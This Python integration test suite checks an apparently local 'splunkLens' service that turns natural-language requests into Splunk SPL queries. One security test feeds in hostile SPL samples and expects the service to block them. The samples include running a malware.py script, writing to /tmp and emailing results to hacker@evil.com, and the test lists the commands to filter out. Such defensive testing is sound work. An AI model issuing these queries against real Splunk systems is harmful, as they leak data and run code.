#!/usr/bin/env python3
"""
Integration tests for splunkLens application
Tests the actual API endpoints and functionality
"""

import requests
import json
import time
from typing import Dict, Any

class SplunkLensIntegrationTest:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.test_results = []
    
    def log_test(self, test_name: str, success: bool, details: str = ""):
        """Log test results"""
        status = "✅ PASS" if success else "❌ FAIL"
        print(f"{status} {test_name}")
        if details:
            print(f"   Details: {details}")
        
        self.test_results.append({
            "test": test_name,
            "success": success,
            "details": details,
            "timestamp": time.time()
        })
    
    def test_health_check(self):
        """Test basic health check"""
        try:
            response = self.session.get(f"{self.base_url}/")
            success = response.status_code == 200 and "splunkLens API is running" in response.text
            self.log_test("Health Check", success, f"Status: {response.status_code}")
            return success
        except Exception as e:
            self.log_test("Health Check", False, f"Error: {e}")
            return False
    
    def test_spl_generation_basic(self):
        """Test basic SPL generation"""
        try:
            payload = {
                "query": "Show me all errors from the last hour",
                "index": "main",
                "lookback_days": 1
            }
            
            response = self.session.post(f"{self.base_url}/generate-spl", json=payload)
            
            if response.status_code == 200:
                data = response.json()
                required_fields = ["spl", "explanation", "estimated_cost", "estimated_results"]
                has_all_fields = all(field in data for field in required_fields)
                
                if has_all_fields and "search" in data["spl"]:
                    self.log_test("Basic SPL Generation", True, f"Generated: {data['spl'][:50]}...")
                    return True
                else:
                    self.log_test("Basic SPL Generation", False, "Missing required fields or invalid SPL")
                    return False
            else:
                self.log_test("Basic SPL Generation", False, f"HTTP {response.status_code}: {response.text}")
                return False
                
        except Exception as e:
            self.log_test("Basic SPL Generation", False, f"Error: {e}")
            return False
    
    def test_spl_generation_complex(self):
        """Test complex SPL generation"""
        test_queries = [
            {
                "query": "Count authentication failures by user in the last 24 hours",
                "expected_keywords": ["stats", "count", "by"]
            },
            {
                "query": "Show top 10 source IPs by traffic volume",
                "expected_keywords": ["stats", "top", "src_ip"]
            },
            {
                "query": "Display web server response times over time",
                "expected_keywords": ["timechart", "response_time"]
            }
        ]
        
        success_count = 0
        for i, test_case in enumerate(test_queries):
            try:
                payload = {
                    "query": test_case["query"],
                    "index": "main",
                    "lookback_days": 1
                }
                
                response = self.session.post(f"{self.base_url}/generate-spl", json=payload)
                
                if response.status_code == 200:
                    data = response.json()
                    spl = data.get("spl", "").lower()
                    
                    # Check if expected keywords are present
                    keywords_found = sum(1 for keyword in test_case["expected_keywords"] if keyword in spl)
                    
                    if keywords_found >= len(test_case["expected_keywords"]) // 2:  # At least half the keywords
                        success_count += 1
                        self.log_test(f"Complex Query {i+1}", True, f"Keywords found: {keywords_found}/{len(test_case['expected_keywords'])}")
                    else:
                        self.log_test(f"Complex Query {i+1}", False, f"Missing keywords in: {spl[:50]}...")
                else:
                    self.log_test(f"Complex Query {i+1}", False, f"HTTP {response.status_code}")
                    
            except Exception as e:
                self.log_test(f"Complex Query {i+1}", False, f"Error: {e}")
        
        overall_success = success_count >= len(test_queries) // 2
        self.log_test("Complex SPL Generation", overall_success, f"{success_count}/{len(test_queries)} queries successful")
        return overall_success
    
    def test_security_validation(self):
        """Test security validation features"""
        dangerous_queries = [
            "| rest /services/server/info",
            "search index=main | script python malware.py",
            "search index=main | outputcsv /tmp/data.csv",
            "search index=main | sendemail to=hacker@evil.com"
        ]
        
        blocked_count = 0
        for i, dangerous_query in enumerate(dangerous_queries):
            try:
                payload = {
                    "query": dangerous_query,
                    "index": "main",
                    "lookback_days": 1
                }
                
                response = self.session.post(f"{self.base_url}/generate-spl", json=payload)
                
                # Should be blocked (400 error) or generate safe SPL
                if response.status_code == 400 or (response.status_code == 200 and not any(cmd in response.json().get("spl", "") for cmd in ["rest", "script", "outputcsv", "sendemail"])):
                    blocked_count += 1
                    self.log_test(f"Security Block {i+1}", True, "Dangerous query properly handled")
                else:
                    self.log_test(f"Security Block {i+1}", False, f"Dangerous query not blocked: {response.status_code}")
                    
            except Exception as e:
                self.log_test(f"Security Block {i+1}", False, f"Error: {e}")
        
        overall_success = blocked_count == len(dangerous_queries)
        self.log_test("Security Validation", overall_success, f"{blocked_count}/{len(dangerous_queries)} dangerous queries blocked")
        return overall_success
    
    def test_input_validation(self):
        """Test input validation"""
        invalid_inputs = [
            {},  # Empty payload
            {"query": ""},  # Empty query
            {"query": "test", "lookback_days": -1},  # Invalid lookback
            {"query": "test", "lookback_days": 1000},  # Too large lookback
        ]
        
        validation_count = 0
        for i, invalid_input in enumerate(invalid_inputs):
            try:
                response = self.session.post(f"{self.base_url}/generate-spl", json=invalid_input)
                
                # Should return 400 or 422 for validation errors
                if response.status_code in [400, 422]:
                    validation_count += 1
                    self.log_test(f"Input Validation {i+1}", True, f"Invalid input rejected: {response.status_code}")
                else:
                    self.log_test(f"Input Validation {i+1}", False, f"Invalid input accepted: {response.status_code}")
                    
            except Exception as e:
                self.log_test(f"Input Validation {i+1}", False, f"Error: {e}")
        
        overall_success = validation_count >= len(invalid_inputs) // 2
        self.log_test("Input Validation", overall_success, f"{validation_count}/{len(invalid_inputs)} invalid inputs rejected")
        return overall_success
    
    def test_splunk_integration_mock(self):
        """Test Splunk integration with mock data (no real Splunk needed)"""
        try:
            payload = {
                "spl": "search index=main error | stats count",
                "max_results": 100
            }
            
            response = self.session.post(f"{self.base_url}/run-splunk", json=payload)
            
            # Should fail with authentication error (400) since no token provided
            if response.status_code == 400 and "authentication" in response.text.lower():
                self.log_test("Splunk Integration (Auth)", True, "Properly requires authentication")
                return True
            else:
                self.log_test("Splunk Integration (Auth)", False, f"Unexpected response: {response.status_code}")
                return False
                
        except Exception as e:
            self.log_test("Splunk Integration (Auth)", False, f"Error: {e}")
            return False
    
    def test_api_documentation(self):
        """Test API documentation endpoint"""
        try:
            response = self.session.get(f"{self.base_url}/docs")
            success = response.status_code == 200 and "swagger" in response.text.lower()
            self.log_test("API Documentation", success, f"Docs available at /docs")
            return success
        except Exception as e:
            self.log_test("API Documentation", False, f"Error: {e}")
            return False
    
    def test_performance(self):
        """Test basic performance metrics"""
        try:
            payload = {
                "query": "Show me errors from today",
                "index": "main",
                "lookback_days": 1
            }
            
            start_time = time.time()
            response = self.session.post(f"{self.base_url}/generate-spl", json=payload)
            end_time = time.time()
            
            response_time = (end_time - start_time) * 1000  # Convert to milliseconds
            
            if response.status_code == 200 and response_time < 5000:  # Less than 5 seconds
                self.log_test("Performance Test", True, f"Response time: {response_time:.2f}ms")
                return True
            else:
                self.log_test("Performance Test", False, f"Slow response: {response_time:.2f}ms or error {response.status_code}")
                return False
                
        except Exception as e:
            self.log_test("Performance Test", False, f"Error: {e}")
            return False
    
    def run_all_tests(self):
        """Run all integration tests"""
        print("🚀 Starting splunkLens Integration Tests\n")
        
        tests = [
            self.test_health_check,
            self.test_api_documentation,
            self.test_input_validation,
            self.test_spl_generation_basic,
            self.test_spl_generation_complex,
            self.test_security_validation,
            self.test_splunk_integration_mock,
            self.test_performance
        ]
        
        passed = 0
        total = len(tests)
        
        for test in tests:
            if test():
                passed += 1
            print()  # Empty line between tests
        
        print(f"\n📊 Test Results: {passed}/{total} tests passed")
        
        if passed == total:
            print("🎉 All tests passed! splunkLens is working correctly.")
        elif passed >= total * 0.8:
            print("✅ Most tests passed. Application is mostly functional.")
        elif passed >= total * 0.5:
            print("⚠️  Some tests failed. Application has issues that need attention.")
        else:
            print("❌ Many tests failed. Application has serious issues.")
        
        return passed, total
    
    def generate_test_report(self):
        """Generate a detailed test report"""
        report = {
            "timestamp": time.time(),
            "total_tests": len(self.test_results),
            "passed_tests": sum(1 for result in self.test_results if result["success"]),
            "failed_tests": sum(1 for result in self.test_results if not result["success"]),
            "test_details": self.test_results
        }
        
        with open("integration_test_report.json", "w") as f:
            json.dump(report, f, indent=2)
        
        print(f"\n📄 Detailed test report saved to: integration_test_report.json")
        return report

if __name__ == "__main__":
    # Run the integration tests
    tester = SplunkLensIntegrationTest()
    
    try:
        passed, total = tester.run_all_tests()
        report = tester.generate_test_report()
        
        # Exit with appropriate code
        exit(0 if passed == total else 1)
        
    except KeyboardInterrupt:
        print("\n⏹️  Tests interrupted by user")
        exit(1)
    except Exception as e:
        print(f"\n💥 Test runner error: {e}")
        exit(1)